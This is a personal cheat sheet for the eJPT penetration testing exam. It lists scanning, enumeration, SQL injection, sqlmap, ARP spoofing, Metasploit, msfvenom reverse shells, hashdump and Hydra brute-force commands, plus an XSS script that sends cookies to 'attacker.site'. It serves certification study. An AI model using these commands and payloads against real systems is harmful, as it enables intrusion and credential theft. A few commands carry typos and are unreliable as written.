# eJPT Notes - eLearnSecurity Junior Penetration Tester Certificate Notes
![[Pasted image 20210326033756.png]]


### NOTE
- **I am not -  affiliated with eLearnSecurity in any way and these notes do not guarantee that you pass.** 
- Replace 10.10.10.2 with the proper IP based on your situation

## What is this?
- The notes below are **personal** notes I took while studying for eLearnSecurity's eJPT certificate in their Penetration Testing Student (PTS) course. 
	- I passed on the first attempt in great part due to the labs and taking notes throughout. 

## What this includes: 	
- Condensed Notes (below this section): Short notes with snippets in case you forget a command/ concept
- Full Notes: This includes explanations/ tidbits from the non-lab portions and can possibly help with general interview questions. 

----

# Condensed Notes: 

## Enumeration:
### Ping Sweep:
- fping: `fping -a -g {IP RANGE} 2>/dev/null`
	- EX: `fping -a -g 10.10.10.0/8 2>/dev/null`
- Nmap Ping Sweep: 
	```
	nmap -sn 10.10.10.0/8 | grep -oP '(?<=Nmap scan report for )[^ ]*'
	```
	
### Nmap
- Full Scan (All Ports, Syn, Scripts, Version, Speed): 
	```
	nmap -Pn -T4 --open -sS -sC -sV --min-rate=1000 --max-retries=3 -p- -oN scanReportForHost2 10.10.10.2
	```
	- Replace `-sS` with `-sT` for full TCP 

- Quick Scan (WARNING NOT ALL PORTS): 
	```
	nmap -sC -sV 10.10.10.2
	```
- IP Range: 
	```
	nmap -sC -sV 10.10.10.2-33
	```
- Select IPs: 
	```
	nmap -sC -sV 10.10.10.2,3,6,9
	```
- Vulnerability Scan for specific services:
	```
	nmap --script suspectedVulnScript(s)Here -p {PORT(s)} 10.10.10.2
	```

- Shares Enumeration: 
	```r
	nbstat -A 10.10.10.2
	nmblookup -A 10.10.10.2
	smbclient //10.10.10.2/share -N # mounts share
	smbclient -L //10.10.10.2 -N # lists shares and omits NetBIOS asking for a pss
	enum4linux -a 10.10.10.2 
	```

### Banner Grabbing
- Netcat format: `nc {Target IP} {Port}`
- Netcat (HTTP Only):
	```
	nc 10.10.10.2 80  
	HEAD / HTTP/1.0 #NOTE: PUT TWO EMPTY LINES AFTER! 
					# EMPTY LINE HERE
					# EMPTY LINE HERE AGAIN
	```
- Netcat (See all available verb OPTIONS):
	```
	nc 10.10.10.2
	OPTIONS / HTTP/1.0 
	```
- OpenSSL (HTTPS)
	```
	opnessl s_client -connect 10.10.10.2:443
	HEAD / HTTP/1.0
	```

### Wireshark Snippets
```
request.method == "POST"     
http & ip.src == 192.168.0.1     
tcp.port == xx     
tcp.srcport == xx     
http.request
```
- After capturing/ opening traffic:
	- Follow -> TCP Stream


## Web Enumeration
### Web Scanning:
- Nikto - General Scan: 
	```
	nikto -h http://10.10.10.2/
	```

### Directory Traversal: 
- gobuster (recommended):
	```
	gobuster dir -u http://10.10.10.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
	```
- gobuster with auth and file extensions: 
	```
	gobuster dir -u http://10.10.10.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -U admin -x /,php,txt,bak,old,html,xxx
	```
	- You might want to dial down the extensions `-x php,txt` based on the target you're after. In this case, we know the password for the user `-U admin`
- dirb: 
	```
	dirb http://10.10.10.2/ /usr/share/wordlists/dirb/common.txt
	```
- dirb with auth: 
	```
	http://targetsite.site/ -u "admin:password"
	```

## Routing/ Pivoting:
-   `route -n` (linux) - Clean routing table. Definitely use this when setting up a route, makes seeing the Destination and Gateway more clear!
-   `arp -a` (linux/ windows) - Show you the ARP table, gateway, and iface
-   `ip route` (linux) - Show you the routing setup you have
- Add Route/ Pivot:
	- `ip route add` {CONNECT TO THIS NETWORK} `via` {FROM THIS IP}
	- `ip route add 10.10.10.0/8 via 10.10.10.99`

---

## Web Exploitation
### SQL Injection (SQLi):
- Basic union injection (Manual): 
	```
	xxxx' UNION SELECT null; -- -
	```
- Basic login bypass (Manual):
	```
	' or 1=1; -- -'  
	```

- SQLMap with a parameter:
	```bash
	sqlmap -u 'http://vuln.site/item.php?id=203' -p id --technique=U # Enum 'id' parameter and use the UNION technique

	sqlmap -u http://10.10.10.2/item.php?id=203 --tables # Shows us all tables in the DB

	```
- SQLMap dump:
	```bash
	sqlmap -u 'http://vuln.site/view.php?id=203' --dump # has potential to take down servers in IRL situations
	```

### Cross-Site Scripting (XSS):
- Find a vulnerable input field: `<script>alert('Fight On!')</script>`
- Steal cookie (helpful with stored-xss):
	```js
	<script\>
	var i \= new Image();
	i.src\="http://attacker.site/log.php?q="+document.cookie; 
	</script\>
	```
---
## Host Exploitation

### ARP Spoofing
```py
echo 1 > /proc/sys/net/ipv4/ip_forward # So once traffic reaches us, proceeds to the vicitm

arpspoof -i tap0 -t 10.10.10.2 -r 10.10.10.6
```

### Metasploit
- Basic Commands: 
	```r
	search xxxx 		# EX: search tomcat
	use xxxx 			# EX: use 1... or use itemNameHere
	set xxxx 			# Configure target IP and whatever required settings required for the module/ exploit 
	options, show options, advanced options xxxx #Shows you all options for the payload/ module you have set
	show payloads 		# In case you need to switch to a bind shell in cases where a revshell or go all out for a meterpreter shell
	select payload xxxx # To actually switch to whatever payload you want

	```
- Generate a payload:  
	```bash
	msfvenom -p php/reverse_php lhost={Attacker IP} lport=443 -o revShell.php # Basic php reverse shell

	msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf # Linux reverse shell

	```
- Upgrade to a meterpreter shell:
	```bash
	use post/multi/manager/shell_to_meterpreter
	```
- Meterpreter - Helpful Commands:
	```bash
	background
	session -l # Lists your open sessions
	sessions -i 3 # Interact with/ open/ enter session 3
	getsystem # PrivEsc for Windows
	sysinfo, ifconfig, route, getuid # Internal Enumeration
	download thisFile.txt /in/my/directory/here
	hashdump # Dumps Windows SAM password hashes  
	```

### Netcat Listener
```
nc -nvlp 8888 # Listening on port 8888
```
### Passwords
- Prepare a file for John the Ripper to crack:
	```
	unshadow passwd shadow > crackThisPls
	```
- Crack the passwords with John: 
	```
	john --wordlist=/my/wordlist/is/here.txt crackThisPls
	```
- Brute-force with Hydra:
	- Change ssh/ telnet to the service you are targeting
	```r
	hydra -L usersList.txt -P passList.txt -t 10 10.10.10.2 ssh -s 22 
	
	hydra -L usersList -P passList telnet://10.10.10.2 -V # verbose so you see real-time when a password is found
	```

---
## Last Minute Reminders
- Once you compromise a box, cat the /etc/hosts file or it's equivalent to find other hosts. This was crucial in the labs. 
- You MUST do a full port scan, do not hurry, the labs had some ports without a full scan you would have missed. 
	- T5 speed on nmap omits some ports for me, your experience may vary, I think sticking to T4 or less is wise. 
- For web: After you get some creds, try to pipe them into gobuster for an authenticated traversal.
- If nmap's service version scan (-sV) is of no help, grab the banner with nc
- If SQLi does not work right away, try appending commands instead of using a boolean:
	-    Instead of `page?id=21' or 1=1 -- -`, insert the next statement directly, `page?id=21 AND SELECT ...`
- Let gobuster run for a while, and run dirb as well and have it run for a while too, in case one of them does not catch a directory. 
- Again, seriously do not hurry and miss things out. 
- Enumerate! Enumerate! Enumerate! Everything. Every directory, file, if you get stuck. 

---
## Helpful Cheatsheets
- SQL Union Injections (If you want to do the injection manually, it's actually fun!): https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635 
- Basic SQL Injection for Authentication Bypass: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/\
- TTY Shells:  https://netsec.ws/?p=337


	
